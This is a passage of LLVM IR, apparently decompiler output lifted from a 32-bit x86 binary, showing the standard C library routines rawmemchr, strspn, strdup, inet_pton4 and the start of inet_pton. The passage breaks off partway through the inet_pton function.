  %v10_8057a70 = add i32 %v9_8057a70, %v0_8057a70
  store i32 %v10_8057a70, i32* %esi.global-to-local, align 4
  %v3_8057a71 = inttoptr i32 %v2_8057a7a15 to i8*
  store i8 %v2_8057a70, i8* %v3_8057a71, align 1
  %v4_8057a71 = load i32, i32* %edi.global-to-local, align 4
  %v5_8057a71 = load i1, i1* @df, align 1
  %v6_8057a71 = select i1 %v5_8057a71, i32 -1, i32 1
  %v7_8057a71 = add i32 %v6_8057a71, %v4_8057a71
  store i32 %v7_8057a71, i32* %edi.global-to-local, align 4
  %v0_8057a72 = load i32, i32* %eax.global-to-local, align 4
  %v3_8057a72 = trunc i32 %v0_8057a72 to i8
  %v4_8057a72 = icmp eq i8 %v3_8057a72, 0
  %v1_8057a74 = icmp eq i1 %v4_8057a72, false
  br i1 %v1_8057a74, label %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge, label %dec_label_pc_8057a7b

dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge: ; preds = %dec_label_pc_8057a70
  %v0_8057a6d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057a6d = add i32 %v0_8057a6d.pre, -1
  %v8_8057a6d = icmp eq i32 %v1_8057a6d, 0
  store i32 %v1_8057a6d, i32* %ecx.global-to-local, align 4
  br i1 %v8_8057a6d, label %dec_label_pc_8057a78, label %dec_label_pc_8057a70

dec_label_pc_8057a78:                             ; preds = %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge, %entry
  %v2_8057a7a.lcssa = phi i32 [ %v2_8057a69, %entry ], [ %v7_8057a71, %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8057a7a = inttoptr i32 %v2_8057a7a.lcssa to i8*
  store i8 0, i8* %v3_8057a7a, align 1
  %v4_8057a7a = load i32, i32* %edi.global-to-local, align 4
  %v5_8057a7a = load i1, i1* @df, align 1
  %v6_8057a7a = select i1 %v5_8057a7a, i32 -1, i32 1
  %v7_8057a7a = add i32 %v6_8057a7a, %v4_8057a7a
  store i32 %v7_8057a7a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8057a7b

dec_label_pc_8057a7b:                             ; preds = %dec_label_pc_8057a70, %dec_label_pc_8057a78
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8057a7f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8057a7f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8057a6d, { 1, 0 }
  uselistorder i32 %v0_8057a72, { 1, 0 }
  uselistorder i32 %v7_8057a71, { 0, 2, 1 }
  uselistorder i1 %v5_8057a71, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8057a7b, { 1, 0 }
  uselistorder label %dec_label_pc_8057a70, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8057a85 = load i32, i32* @ebx, align 4
  %v4_8057a86 = urem i32 %arg2, 256
  %v4_8057a8a = ptrtoint i8* %arg1 to i32
  %v2_8057a953 = urem i32 %v4_8057a8a, 4
  %v3_8057a954 = icmp eq i32 %v2_8057a953, 0
  %v1_8057a978 = icmp eq i1 %v3_8057a954, false
  %v4_8057a90 = trunc i32 %arg2 to i8
  br i1 %v1_8057a978, label %dec_label_pc_8057a90, label %dec_label_pc_8057a99

dec_label_pc_8057a90:                             ; preds = %entry, %dec_label_pc_8057a94
  %v0_8057a94 = phi i32 [ %v1_8057a94, %dec_label_pc_8057a94 ], [ %v4_8057a8a, %entry ]
  %v1_8057a90 = inttoptr i32 %v0_8057a94 to i8*
  %v2_8057a90 = load i8, i8* %v1_8057a90, align 1
  %v15_8057a90 = icmp eq i8 %v2_8057a90, %v4_8057a90
  br i1 %v15_8057a90, label %dec_label_pc_8057ae4, label %dec_label_pc_8057a94

dec_label_pc_8057a94:                             ; preds = %dec_label_pc_8057a90
  %v1_8057a94 = add i32 %v0_8057a94, 1
  %v2_8057a95 = urem i32 %v1_8057a94, 4
  %v3_8057a95 = icmp eq i32 %v2_8057a95, 0
  %v1_8057a97 = icmp eq i1 %v3_8057a95, false
  br i1 %v1_8057a97, label %dec_label_pc_8057a90, label %dec_label_pc_8057a99

dec_label_pc_8057a99:                             ; preds = %entry, %dec_label_pc_8057a94
  %v0_8057a9c = phi i32 [ %v1_8057a94, %dec_label_pc_8057a94 ], [ %v4_8057a8a, %entry ]
  %v2_8057aa0 = mul nuw nsw i32 %v4_8057a86, 256
  %v2_8057aa3 = or i32 %v2_8057aa0, %v4_8057a86
  %v2_8057aa7 = mul i32 %v2_8057aa3, 65536
  %v2_8057aaa = or i32 %v2_8057aa7, %v2_8057aa3
  br label %dec_label_pc_8057aac

dec_label_pc_8057aac:                             ; preds = %dec_label_pc_8057adc, %dec_label_pc_8057aac, %dec_label_pc_8057a99
  %v0_8057ab0 = phi i32 [ %v0_8057a9c, %dec_label_pc_8057a99 ], [ %v1_8057ab0, %dec_label_pc_8057aac ], [ %v1_8057ab0, %dec_label_pc_8057adc ]
  %v2_8057aae = inttoptr i32 %v0_8057ab0 to i32*
  %v3_8057aae = load i32, i32* %v2_8057aae, align 4
  %v4_8057aae = xor i32 %v3_8057aae, %v2_8057aaa
  %v1_8057ab0 = add i32 %v0_8057ab0, 4
  store i32 %v1_8057ab0, i32* @ecx, align 4
  %v1_8057ab3 = add i32 %v4_8057aae, 2130640639
  %v1_8057ab9 = sub i32 -1, %v4_8057aae
  store i32 %v1_8057ab9, i32* @edx, align 4
  %v2_8057abb = xor i32 %v1_8057ab3, %v1_8057ab9
  %v1_8057abd = and i32 %v2_8057abb, -2130640640
  %v2_8057abd = icmp eq i32 %v1_8057abd, 0
  br i1 %v2_8057abd, label %dec_label_pc_8057aac, label %dec_label_pc_8057ac4

dec_label_pc_8057ac4:                             ; preds = %dec_label_pc_8057aac
  %v2_8057ac4 = inttoptr i32 %v0_8057ab0 to i8*
  %v3_8057ac4 = load i8, i8* %v2_8057ac4, align 1
  %v16_8057ac4 = icmp eq i8 %v3_8057ac4, %v4_8057a90
  br i1 %v16_8057ac4, label %dec_label_pc_8057ae4, label %dec_label_pc_8057acc

dec_label_pc_8057acc:                             ; preds = %dec_label_pc_8057ac4
  %v1_8057acc = add i32 %v0_8057ab0, 1
  %v2_8057acc = inttoptr i32 %v1_8057acc to i8*
  %v3_8057acc = load i8, i8* %v2_8057acc, align 1
  %v16_8057acc = icmp eq i8 %v3_8057acc, %v4_8057a90
  br i1 %v16_8057acc, label %dec_label_pc_8057ae4, label %dec_label_pc_8057ad4

dec_label_pc_8057ad4:                             ; preds = %dec_label_pc_8057acc
  %v1_8057ad4 = add i32 %v0_8057ab0, 2
  %v2_8057ad4 = inttoptr i32 %v1_8057ad4 to i8*
  %v3_8057ad4 = load i8, i8* %v2_8057ad4, align 1
  %v16_8057ad4 = icmp eq i8 %v3_8057ad4, %v4_8057a90
  br i1 %v16_8057ad4, label %dec_label_pc_8057ae4, label %dec_label_pc_8057adc

dec_label_pc_8057adc:                             ; preds = %dec_label_pc_8057ad4
  %v1_8057adc = add i32 %v0_8057ab0, 3
  %v2_8057adc = inttoptr i32 %v1_8057adc to i8*
  %v3_8057adc = load i8, i8* %v2_8057adc, align 1
  %v16_8057adc = icmp eq i8 %v3_8057adc, %v4_8057a90
  %v1_8057ae2 = icmp eq i1 %v16_8057adc, false
  br i1 %v1_8057ae2, label %dec_label_pc_8057aac, label %dec_label_pc_8057ae4

dec_label_pc_8057ae4:                             ; preds = %dec_label_pc_8057a90, %dec_label_pc_8057adc, %dec_label_pc_8057ad4, %dec_label_pc_8057acc, %dec_label_pc_8057ac4
  %v0_8057ae6 = phi i32 [ %v1_8057adc, %dec_label_pc_8057adc ], [ %v1_8057ad4, %dec_label_pc_8057ad4 ], [ %v1_8057acc, %dec_label_pc_8057acc ], [ %v0_8057ab0, %dec_label_pc_8057ac4 ], [ %v0_8057a94, %dec_label_pc_8057a90 ]
  store i32 %v0_8057a85, i32* @ebx, align 4
  ret i32 %v0_8057ae6

; uselistorder directives
  uselistorder i32 %v1_8057ab9, { 1, 0 }
  uselistorder i32 %v1_8057ab0, { 2, 1, 0 }
  uselistorder i32 %v2_8057aa3, { 1, 0 }
  uselistorder i32 %v1_8057a94, { 1, 0, 2 }
  uselistorder i8 %v4_8057a90, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8057a8a, { 2, 1, 0 }
  uselistorder i32 %v4_8057a86, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8057ae4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8057a99, { 1, 0 }
  uselistorder label %dec_label_pc_8057a90, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8057b0a31 = load i8, i8* %arg1, align 1
  %v4_8057b0c35 = icmp eq i8 %v2_8057b0a31, 0
  br i1 %v4_8057b0c35, label %dec_label_pc_8057b14, label %dec_label_pc_8057b10.lr.ph

dec_label_pc_8057b10.lr.ph:                       ; preds = %entry
  %v3_8057b0a32 = zext i8 %v2_8057b0a31 to i32
  %v4_8057b0a.pre = load i32, i32* @eax, align 4
  %v5_8057b0a33 = and i32 %v4_8057b0a.pre, -256
  %v6_8057b0a34 = or i32 %v3_8057b0a32, %v5_8057b0a33
  %v4_8057af1 = ptrtoint i8* %arg1 to i32
  %v1_8057afc18 = inttoptr i32 %arg2 to i8*
  %v4_8057afc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057b10

dec_label_pc_8057af7:                             ; preds = %dec_label_pc_8057b10, %dec_label_pc_8057afb
  %v6_8057afc28 = phi i32 [ %v6_8057afc, %dec_label_pc_8057afb ], [ %v6_8057afc22, %dec_label_pc_8057b10 ]
  %v2_8057afc27 = phi i8 [ %v2_8057afc, %dec_label_pc_8057afb ], [ %v2_8057afc19, %dec_label_pc_8057b10 ]
  %v0_8057afb26 = phi i32 [ %v1_8057afb, %dec_label_pc_8057afb ], [ %arg2, %dec_label_pc_8057b10 ]
  %v15_8057af7 = icmp eq i8 %v2_8057b0a39, %v2_8057afc27
  br i1 %v15_8057af7, label %dec_label_pc_8057b04, label %dec_label_pc_8057afb

dec_label_pc_8057afb:                             ; preds = %dec_label_pc_8057af7
  %v1_8057afb = add i32 %v0_8057afb26, 1
  store i32 %v1_8057afb, i32* @edx, align 4
  %v1_8057afc = inttoptr i32 %v1_8057afb to i8*
  %v2_8057afc = load i8, i8* %v1_8057afc, align 1
  %v3_8057afc = zext i8 %v2_8057afc to i32
  %v5_8057afc = and i32 %v6_8057afc28, -256
  %v6_8057afc = or i32 %v3_8057afc, %v5_8057afc
  store i32 %v6_8057afc, i32* @ecx, align 4
  %v4_8057afe = icmp eq i8 %v2_8057afc, 0
  %v1_8057b00 = icmp eq i1 %v4_8057afe, false
  br i1 %v1_8057b00, label %dec_label_pc_8057af7, label %dec_label_pc_8057b14

dec_label_pc_8057b04:                             ; preds = %dec_label_pc_8057af7
  %v1_8057b08 = add i32 %v0_8057b1537, 1
  %v1_8057b09 = add i32 %v0_8057b0938, 1
  %v1_8057b0a = inttoptr i32 %v1_8057b09 to i8*
  %v2_8057b0a = load i8, i8* %v1_8057b0a, align 1
  %v3_8057b0a = zext i8 %v2_8057b0a to i32
  %v5_8057b0a = and i32 %v6_8057b0a40, -256
  %v6_8057b0a = or i32 %v3_8057b0a, %v5_8057b0a
  %v4_8057b0c = icmp eq i8 %v2_8057b0a, 0
  br i1 %v4_8057b0c, label %dec_label_pc_8057b14, label %dec_label_pc_8057b10

dec_label_pc_8057b10:                             ; preds = %dec_label_pc_8057b10.lr.ph, %dec_label_pc_8057b04
  %v4_8057afc.pre = phi i32 [ %v4_8057afc.pre.pre, %dec_label_pc_8057b10.lr.ph ], [ %v6_8057afc28, %dec_label_pc_8057b04 ]
  %v6_8057b0a40 = phi i32 [ %v6_8057b0a34, %dec_label_pc_8057b10.lr.ph ], [ %v6_8057b0a, %dec_label_pc_8057b04 ]
  %v2_8057b0a39 = phi i8 [ %v2_8057b0a31, %dec_label_pc_8057b10.lr.ph ], [ %v2_8057b0a, %dec_label_pc_8057b04 ]
  %v0_8057b0938 = phi i32 [ %v4_8057af1, %dec_label_pc_8057b10.lr.ph ], [ %v1_8057b09, %dec_label_pc_8057b04 ]
  %v0_8057b1537 = phi i32 [ 0, %dec_label_pc_8057b10.lr.ph ], [ %v1_8057b08, %dec_label_pc_8057b04 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8057afc19 = load i8, i8* %v1_8057afc18, align 1
  %v3_8057afc20 = zext i8 %v2_8057afc19 to i32
  %v5_8057afc21 = and i32 %v4_8057afc.pre, -256
  %v6_8057afc22 = or i32 %v3_8057afc20, %v5_8057afc21
  store i32 %v6_8057afc22, i32* @ecx, align 4
  %v4_8057afe23 = icmp eq i8 %v2_8057afc19, 0
  %v1_8057b0025 = icmp eq i1 %v4_8057afe23, false
  br i1 %v1_8057b0025, label %dec_label_pc_8057af7, label %dec_label_pc_8057b14

dec_label_pc_8057b14:                             ; preds = %entry, %dec_label_pc_8057b04, %dec_label_pc_8057b10, %dec_label_pc_8057afb
  %v0_8057b1517 = phi i32 [ %v0_8057b1537, %dec_label_pc_8057afb ], [ %v0_8057b1537, %dec_label_pc_8057b10 ], [ 0, %entry ], [ %v1_8057b08, %dec_label_pc_8057b04 ]
  ret i32 %v0_8057b1517

; uselistorder directives
  uselistorder i32 %v6_8057afc22, { 1, 0 }
  uselistorder i8 %v2_8057afc19, { 1, 2, 0 }
  uselistorder i32 %v1_8057b09, { 1, 0 }
  uselistorder i32 %v6_8057afc, { 1, 0 }
  uselistorder i8 %v2_8057afc, { 1, 2, 0 }
  uselistorder i32 %v1_8057afb, { 2, 1, 0 }
  uselistorder i8 %v2_8057b0a31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057b14, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8057b10, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057b1c = load i32, i32* @edi, align 4
  %v0_8057b1d = load i32, i32* @esi, align 4
  %v0_8057b1e = load i32, i32* @ebx, align 4
  store i32 %v0_8057b1e, i32* %stack_var_-12, align 4
  %v4_8057b1f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057b1f, i32* @edi, align 4
  %v3_8057b27 = call i32 @strlen(i8* %arg1)
  %v1_8057b2c = add i32 %v3_8057b27, 1
  store i32 %v1_8057b2c, i32* @esi, align 4
  %v2_8057b32 = call i32 @malloc(i32 %v1_8057b2c)
  %v1_8057b3a = icmp eq i32 %v2_8057b32, 0
  store i32 %v2_8057b32, i32* %ebx.global-to-local, align 4
  br i1 %v1_8057b3a, label %dec_label_pc_8057b4c, label %dec_label_pc_8057b40

dec_label_pc_8057b40:                             ; preds = %entry
  %v0_8057b41 = load i32, i32* @esi, align 4
  %v0_8057b42 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8057b32 to i16*
  %v6_8057b44 = call i32 @memcpy(i16* %tmp11, i32 %v0_8057b42, i32 %v0_8057b41)
  %v0_8057b4c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057b4c

dec_label_pc_8057b4c:                             ; preds = %entry, %dec_label_pc_8057b40
  %v0_8057b4c = phi i32 [ 0, %entry ], [ %v0_8057b4c.pre, %dec_label_pc_8057b40 ]
  %v2_8057b4e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057b4e, i32* @ebx, align 4
  store i32 %v0_8057b1d, i32* @esi, align 4
  store i32 %v0_8057b1c, i32* @edi, align 4
  ret i32 %v0_8057b4c

; uselistorder directives
  uselistorder i32 %v2_8057b32, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 8, 7, 6, 5, 4, 1, 15, 14, 13, 12, 11, 10, 3, 9, 2, 0 }
  uselistorder label %dec_label_pc_8057b4c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8057b5a = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8057b5d = load i32, i32* @ebx, align 4
  store i32 %v0_8057b5d, i32* %stack_var_-16, align 4
  %v0_8057b5e = load i32, i32* @eax, align 4
  store i32 %v0_8057b5e, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8057b60 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8057b63 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057b63, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8057bab15 = inttoptr i32 %v0_8057b5e to i8*
  %v2_8057bab16 = load i8, i8* %v1_8057bab15, align 1
  %v3_8057bab17 = sext i8 %v2_8057bab16 to i32
  store i32 %v3_8057bab17, i32* @ecx, align 4
  %v1_8057bae18 = add i32 %v0_8057b5e, 1
  store i32 %v1_8057bae18, i32* %ebx.global-to-local, align 4
  %v1_8057baf19 = icmp eq i8 %v2_8057bab16, 0
  store i1 %v1_8057baf19, i1* %zf.global-to-local, align 1
  %v1_8057bb121 = icmp eq i1 %v1_8057baf19, false
  br i1 %v1_8057bb121, label %dec_label_pc_8057b6e, label %dec_label_pc_8057bb3

dec_label_pc_8057b6e:                             ; preds = %entry, %dec_label_pc_8057bab.backedge
  %v3_8057bab23 = phi i32 [ %v3_8057bab, %dec_label_pc_8057bab.backedge ], [ %v3_8057bab17, %entry ]
  %v2_8057bab22 = phi i8 [ %v2_8057bab, %dec_label_pc_8057bab.backedge ], [ %v2_8057bab16, %entry ]
  %v1_8057b6e = add nsw i32 %v3_8057bab23, -48
  store i32 %v1_8057b6e, i32* @eax, align 4
  %v9_8057b71 = icmp eq i8 %v2_8057bab22, 57
  store i1 %v9_8057b71, i1* %zf.global-to-local, align 1
  %v6_8057b74 = icmp ugt i32 %v1_8057b6e, 9
  br i1 %v6_8057b74, label %dec_label_pc_8057b97, label %dec_label_pc_8057b76

dec_label_pc_8057b76:                             ; preds = %dec_label_pc_8057b6e
  %v0_8057b76 = load i32, i32* @esi, align 4
  %v1_8057b76 = inttoptr i32 %v0_8057b76 to i8*
  %v2_8057b76 = load i8, i8* %v1_8057b76, align 1
  %v2_8057b79 = zext i8 %v2_8057b76 to i32
  %v3_8057b79 = mul nuw nsw i32 %v2_8057b79, 10
  %v3_8057b7c = add nsw i32 %v3_8057b79, %v1_8057b6e
  store i32 %v3_8057b7c, i32* @eax, align 4
  %v9_8057b80 = icmp eq i32 %v3_8057b7c, 255
  store i1 %v9_8057b80, i1* %zf.global-to-local, align 1
  %v6_8057b85 = icmp ugt i32 %v3_8057b7c, 255
  br i1 %v6_8057b85, label %dec_label_pc_8057bd0, label %dec_label_pc_8057b87

dec_label_pc_8057b87:                             ; preds = %dec_label_pc_8057b76
  %v0_8057b87 = load i32, i32* @edx, align 4
  %v1_8057b87 = icmp eq i32 %v0_8057b87, 0
  store i1 %v1_8057b87, i1* %zf.global-to-local, align 1
  %v1_8057b89 = trunc i32 %v3_8057b7c to i8
  store i8 %v1_8057b89, i8* %v1_8057b76, align 1
  %v0_8057b8b = load i1, i1* %zf.global-to-local, align 1
  %v1_8057b8b = icmp eq i1 %v0_8057b8b, false
  br i1 %v1_8057b8b, label %dec_label_pc_8057bab.backedge, label %dec_label_pc_8057b8d

dec_label_pc_8057b8d:                             ; preds = %dec_label_pc_8057b87
  %v0_8057b8d = load i32, i32* @edi, align 4
  %v1_8057b8d = add i32 %v0_8057b8d, 1
  store i32 %v1_8057b8d, i32* @edi, align 4
  %v1_8057b8e = add i32 %v0_8057b8d, -3
  %v6_8057b8e = sub i32 2, %v0_8057b8d
  %v7_8057b8e = and i32 %v6_8057b8e, %v1_8057b8d
  %v8_8057b8e = icmp slt i32 %v7_8057b8e, 0
  %v9_8057b8e = icmp eq i32 %v1_8057b8e, 0
  store i1 %v9_8057b8e, i1* %zf.global-to-local, align 1
  %v10_8057b8e = icmp slt i32 %v1_8057b8e, 0
  %v3_8057b91 = icmp eq i1 %v10_8057b8e, %v8_8057b8e
  %v4_8057b91 = icmp eq i1 %v9_8057b8e, false
  %v5_8057b91 = and i1 %v4_8057b91, %v3_8057b91
  br i1 %v5_8057b91, label %dec_label_pc_8057bd0, label %dec_label_pc_8057b93

dec_label_pc_8057b93:                             ; preds = %dec_label_pc_8057b8d
  %v0_8057b93 = load i32, i32* @edx, align 4
  %v1_8057b93 = and i32 %v0_8057b93, -256
  %v2_8057b93 = or i32 %v1_8057b93, 1
  store i32 %v2_8057b93, i32* @edx, align 4
  br label %dec_label_pc_8057bab.backedge

dec_label_pc_8057b97:                             ; preds = %dec_label_pc_8057b6e
  %v9_8057b97 = icmp eq i8 %v2_8057bab22, 46
  store i1 %v9_8057b97, i1* %zf.global-to-local, align 1
  %v1_8057b9a = icmp eq i1 %v9_8057b97, false
  br i1 %v1_8057b9a, label %dec_label_pc_8057bd0, label %dec_label_pc_8057b9c

dec_label_pc_8057b9c:                             ; preds = %dec_label_pc_8057b97
  %v0_8057b9c = load i32, i32* @edx, align 4
  %v1_8057b9c = icmp eq i32 %v0_8057b9c, 0
  store i1 %v1_8057b9c, i1* %zf.global-to-local, align 1
  br i1 %v1_8057b9c, label %dec_label_pc_8057bd0, label %dec_label_pc_8057ba0

dec_label_pc_8057ba0:                             ; preds = %dec_label_pc_8057b9c
  %v0_8057ba0 = load i32, i32* @edi, align 4
  %v9_8057ba0 = icmp eq i32 %v0_8057ba0, 4
  store i1 %v9_8057ba0, i1* %zf.global-to-local, align 1
  br i1 %v9_8057ba0, label %dec_label_pc_8057bd0, label %dec_label_pc_8057ba5

dec_label_pc_8057ba5:                             ; preds = %dec_label_pc_8057ba0
  %v0_8057ba5 = load i32, i32* @esi, align 4
  %v1_8057ba5 = add i32 %v0_8057ba5, 1
  store i32 %v1_8057ba5, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_8057ba8 = inttoptr i32 %v1_8057ba5 to i8*
  store i8 0, i8* %v1_8057ba8, align 1
  br label %dec_label_pc_8057bab.backedge

dec_label_pc_8057bab.backedge:                    ; preds = %dec_label_pc_8057ba5, %dec_label_pc_8057b93, %dec_label_pc_8057b87
  %v0_8057bab.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057bab = inttoptr i32 %v0_8057bab.pre to i8*
  %v2_8057bab = load i8, i8* %v1_8057bab, align 1
  %v3_8057bab = sext i8 %v2_8057bab to i32
  store i32 %v3_8057bab, i32* @ecx, align 4
  %v1_8057bae = add i32 %v0_8057bab.pre, 1
  store i32 %v1_8057bae, i32* %ebx.global-to-local, align 4
  %v1_8057baf = icmp eq i8 %v2_8057bab, 0
  store i1 %v1_8057baf, i1* %zf.global-to-local, align 1
  %v1_8057bb1 = icmp eq i1 %v1_8057baf, false
  br i1 %v1_8057bb1, label %dec_label_pc_8057b6e, label %dec_label_pc_8057bab.dec_label_pc_8057bb3_crit_edge

dec_label_pc_8057bab.dec_label_pc_8057bb3_crit_edge: ; preds = %dec_label_pc_8057bab.backedge
  %v0_8057bb3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057bb3

dec_label_pc_8057bb3:                             ; preds = %dec_label_pc_8057bab.dec_label_pc_8057bb3_crit_edge, %entry
  %v0_8057bb3 = phi i32 [ %v0_8057bb3.pre, %dec_label_pc_8057bab.dec_label_pc_8057bb3_crit_edge ], [ 0, %entry ]
  %v10_8057bb3 = icmp eq i32 %v0_8057bb3, 3
  store i1 %v10_8057bb3, i1* %zf.global-to-local, align 1
  %v7_8057bb6 = icmp sgt i32 %v0_8057bb3, 3
  br i1 %v7_8057bb6, label %dec_label_pc_8057bb8, label %dec_label_pc_8057bd0

dec_label_pc_8057bb8:                             ; preds = %dec_label_pc_8057bb3
  %v0_8057bb8 = load i32, i32* @eax, align 4
  %v3_8057bc1 = bitcast i32* %stack_var_-20 to i16*
  %v4_8057bc1 = call i32 @memcpy(i16* %v3_8057bc1, i32 4, i32 %v0_8057bb8)
  %v0_8057bcb = load i32, i32* @esp, align 4
  %v6_8057bcb = icmp eq i32 %v0_8057bcb, -16
  store i1 %v6_8057bcb, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8057bd2

dec_label_pc_8057bd0:                             ; preds = %dec_label_pc_8057ba0, %dec_label_pc_8057b9c, %dec_label_pc_8057b97, %dec_label_pc_8057b8d, %dec_label_pc_8057b76, %dec_label_pc_8057bb3
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8057bd2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057bd2

dec_label_pc_8057bd2:                             ; preds = %dec_label_pc_8057bb8, %dec_label_pc_8057bd0
  %v0_8057bd2 = phi i32 [ %v15_8057b60, %dec_label_pc_8057bb8 ], [ %v0_8057bd2.pre, %dec_label_pc_8057bd0 ]
  %v0_8057bd9 = phi i32 [ 1, %dec_label_pc_8057bb8 ], [ 0, %dec_label_pc_8057bd0 ]
  %v9_8057bd2 = icmp eq i32 %v0_8057bd2, -28
  store i1 %v9_8057bd2, i1* %zf.global-to-local, align 1
  %v2_8057bd5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057bd5, i32* @ebx, align 4
  store i32 %v0_8057b5a, i32* @esi, align 4
  ret i32 %v0_8057bd9

; uselistorder directives
  uselistorder i32 %v0_8057bb3, { 1, 0 }
  uselistorder i32 %v3_8057bab, { 1, 0 }
  uselistorder i8 %v2_8057bab, { 1, 2, 0 }
  uselistorder i1 %v9_8057ba0, { 1, 0 }
  uselistorder i32 %v1_8057b8e, { 1, 0 }
  uselistorder i32 %v3_8057b7c, { 1, 2, 0, 3 }
  uselistorder i8 %v2_8057bab22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8057bd2, { 1, 0 }
  uselistorder label %dec_label_pc_8057bd0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8057b6e, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8057bda = load i32, i32* @ebp, align 4
  %v0_8057bdb = load i32, i32* @edi, align 4
  %v0_8057bdc = load i32, i32* @esi, align 4
  %v0_8057bdd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8057be5 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8057be5, i32* @edi, align 4
  %v9_8057be9 = icmp eq i32 %arg1, 2
  br i1 %v9_8057be9, label %dec_label_pc_8057bf9, label %dec_label_pc_8057bee

dec_label_pc_8057bee:                             ; preds = %entry
  %v9_8057bee = icmp eq i32 %arg1, 10
  %v1_8057bf1 = icmp eq i1 %v9_8057bee, false
  br i1 %v1_8057bf1, label %dec_label_pc_8057d8a, label %dec_label_pc_8057c09

dec_label_pc_8057bf9:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8057be5, i32* @eax, align 4
  %v3_8057bff = call i32 @inet_pton4(i32 %v0_8057bdd, i32 %v0_8057bdc, i32 %v0_8057bdb)
  store i32 %v3_8057bff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d9c

dec_label_pc_8057c09:                             ; preds = %dec_label_pc_8057bee
  %v2_8057c0e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057c0e, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8057c13 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8057c13, i32* @ebx, align 4
  %v2_8057c1a = add i32 %v5_8057c13, 16
  store i32 %v2_8057c1a, i32* %eax.global-to-local, align 4
  %v0_8057c24 = load i32, i32* @edi, align 4
  %v1_8057c24 = inttoptr i32 %v0_8057c24 to i8*
  %v2_8057c24 = load i8, i8* %v1_8057c24, align 1
  %v11_8057c24 = icmp eq i8 %v2_8057c24, 58
  %v1_8057c27 = icmp eq i1 %v11_8057c24, false
  br i1 %v1_8057c27, label %dec_label_pc_8057cba, label %dec_label_pc_8057c29

dec_label_pc_8057c29:                             ; preds = %dec_label_pc_8057c09
  %v1_8057c29 = add i32 %v0_8057c24, 1
  store i32 %v1_8057c29, i32* @edi, align 4
  %v1_8057c2a = inttoptr i32 %v1_8057c29 to i8*
  %v2_8057c2a = load i8, i8* %v1_8057c2a, align 1
